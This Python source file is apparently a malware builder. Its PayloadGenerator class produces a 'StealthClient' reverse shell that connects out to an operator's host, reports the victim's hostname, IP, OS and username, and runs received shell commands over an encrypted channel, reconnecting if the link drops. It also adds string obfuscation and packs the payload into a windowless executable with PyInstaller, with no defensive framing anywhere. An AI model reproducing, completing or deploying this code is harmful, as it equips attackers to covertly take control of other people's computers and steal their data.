import random
import string
import base64
import zlib
import marshal
import types
import re
import os
import sys
import time
import hashlib
import ctypes
import platform
import psutil
import winreg
import tempfile
import shutil
from datetime import datetime
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import socket
import subprocess
import json

class PayloadGenerator:
    def __init__(self):
        self.encryption_key = Fernet.generate_key()
        self.aes_key = os.urandom(32)
        
    def generate_random_string(self, length):
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
        
    def obfuscate_string(self, s):
        # Multiple layers of encoding with variable encoding
        encodings = [
            lambda x: base64.b64encode(x.encode()).decode(),
            lambda x: base64.b32encode(x.encode()).decode(),
            lambda x: base64.b16encode(x.encode()).decode()
        ]
        
        # Randomly select encoding method
        encoded = random.choice(encodings)(s)
        
        # Add random padding and junk
        padding = self.generate_random_string(random.randint(5, 10))
        junk = ''.join(random.choices(string.ascii_letters, k=random.randint(3, 8)))
        return f"{padding}{junk}{encoded}{junk[::-1]}{padding[::-1]}"
        
    def deobfuscate_string(self, s):
        # Remove padding and junk
        pattern = r'[a-zA-Z0-9]+[a-zA-Z]+([A-Za-z0-9+/=]+)[a-zA-Z]+[a-zA-Z0-9]+'
        match = re.search(pattern, s)
        if match:
            encoded = match.group(1)
            try:
                return base64.b64decode(encoded).decode()
            except:
                try:
                    return base64.b32decode(encoded).decode()
                except:
                    return base64.b16decode(encoded).decode()
        return s
        
    def encrypt_payload(self, payload):
        # AES encryption with random IV
        cipher = AES.new(self.aes_key, AES.MODE_CBC)
        ct_bytes = cipher.encrypt(pad(payload.encode(), AES.block_size))
        iv = base64.b64encode(cipher.iv).decode('utf-8')
        ct = base64.b64encode(ct_bytes).decode('utf-8')
        return f"{iv}:{ct}"
        
    def generate_stealth_payload(self, host, port):
        # Generate a random session ID
        session_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
        
        # Basic payload template
        payload = f'''import socket
import subprocess
import os
import sys
import platform
import time
import base64
import json
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

class StealthClient:
    def __init__(self, host, port, session_id):
        self.host = host
        self.port = port
        self.session_id = session_id
        self.key = {repr(self.encryption_key)}
        self.iv = {repr(self.aes_key)}
        
    def encrypt(self, data):
        cipher = AES.new(self.key, AES.MODE_CBC, self.iv)
        return base64.b64encode(cipher.encrypt(pad(data.encode(), AES.block_size))).decode()
        
    def decrypt(self, data):
        cipher = AES.new(self.key, AES.MODE_CBC, self.iv)
        return unpad(cipher.decrypt(base64.b64decode(data)), AES.block_size).decode()
        
    def get_system_info(self):
        return {{
            'hostname': socket.gethostname(),
            'ip': socket.gethostbyname(socket.gethostname()),
            'os': platform.system(),
            'username': os.getlogin(),
            'python_version': sys.version
        }}
        
    def execute_command(self, command):
        try:
            if platform.system() == 'Windows':
                process = subprocess.Popen(
                    command,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    stdin=subprocess.PIPE
                )
            else:
                process = subprocess.Popen(
                    command,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    stdin=subprocess.PIPE,
                    preexec_fn=os.setsid
                )
                
            stdout, stderr = process.communicate()
            return stdout.decode() + stderr.decode()
        except Exception as e:
            return str(e)
            
    def connect(self):
        while True:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.connect((self.host, self.port))
                    
                    # Send initial connection info
                    info = self.get_system_info()
                    s.send(self.encrypt(json.dumps(info)).encode())
                    
                    while True:
                        # Receive command
                        data = s.recv(4096)
                        if not data:
                            break
                            
                        command = self.decrypt(data.decode())
                        
                        # Execute command and send response
                        response = self.execute_command(command)
                        s.send(self.encrypt(response).encode())
                        
            except Exception as e:
                time.sleep(5)  # Wait before reconnecting
                continue

if __name__ == '__main__':
    client = StealthClient('{host}', {port}, '{session_id}')
    client.connect()
'''
        return payload
        
    def obfuscate_payload(self, payload):
        # Simple obfuscation by encoding strings
        lines = payload.split('\n')
        obfuscated = []
        
        for line in lines:
            if '=' in line and '"' in line:
                # Obfuscate string assignments
                parts = line.split('=')
                if len(parts) == 2:
                    var_name = parts[0].strip()
                    value = parts[1].strip()
                    if value.startswith('"') and value.endswith('"'):
                        # Convert string to base64
                        str_value = value[1:-1]
                        encoded = base64.b64encode(str_value.encode()).decode()
                        obfuscated.append(f"{var_name} = base64.b64decode('{encoded}').decode()")
                        continue
            obfuscated.append(line)
            
        return '\n'.join(obfuscated)
        
    def generate_exe(self, payload, output_path):
        try:
            # Create temporary directory
            with tempfile.TemporaryDirectory() as temp_dir:
                # Write payload to temporary file
                payload_path = os.path.join(temp_dir, 'payload.py')
                with open(payload_path, 'w') as f:
                    f.write(payload)
                    
                # Use PyInstaller to create executable
                subprocess.run([
                    'pyinstaller',
                    '--onefile',
                    '--noconsole',
                    '--clean',
                    f'--distpath={os.path.dirname(output_path)}',
                    f'--workpath={temp_dir}',
                    f'--specpath={temp_dir}',
                    payload_path
                ], check=True)
                
                # Move the executable to the desired location
                exe_name = os.path.splitext(os.path.basename(payload_path))[0] + '.exe'
                temp_exe = os.path.join(temp_dir, 'dist', exe_name)
                shutil.move(temp_exe, output_path)
                
                return True
                
        except Exception as e:
            print(f"Error generating executable: {str(e)}")
            return False 